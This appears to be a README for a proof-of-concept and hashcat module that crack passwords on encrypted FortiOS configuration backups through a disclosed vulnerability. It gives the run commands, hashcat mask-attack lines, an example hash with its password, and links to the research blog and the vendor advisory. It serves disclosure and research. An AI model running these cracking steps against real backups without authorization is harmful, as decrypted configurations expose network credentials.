# FortiGateGate
This is a POC and a hashcat module for FortiOS CVE 2024-21754 we found.

It allows "fast" cracking of encrypted FortiOS configuration backups prior FortiOS 7.4.4. 

# Python POC

python poc.py fortigate_7-4_2360_202308160737_pw_hashcat.conf decrypted hashcat

# Hashcat

Copy the files into the subdirectories of hashcat source code, build and run using module 33900. 

E.g. using

hashcat -a 3 -m 33900 --force --increment ./hash ?l?l?l?l?l?l?l

or when testing/debugging

hashcat -a 3 -m 33900 --self-test-disable --potfile-disable -d 1 -n 1 -u 1 -T 1 --force --increment ./hash ?l?l?l?l?l?l?l

## Example hashcat Input Hash
First 62 bytes of encrypted configuration backup:

234647424b7c347c4647564d36347c377c30347c323336307c0af6daa1d74547a3774f864120d4e86d481e466a44e004559c92495ae0f8c9391f406f7bdf
pw: hashcat


Blogpost: https://cyber.wtf/2024/06/13/give-me-your-fortigate-configuration-backup-and-i-rule-your-network/

FortiNet Advisory: https://www.fortiguard.com/psirt/FG-IR-23-423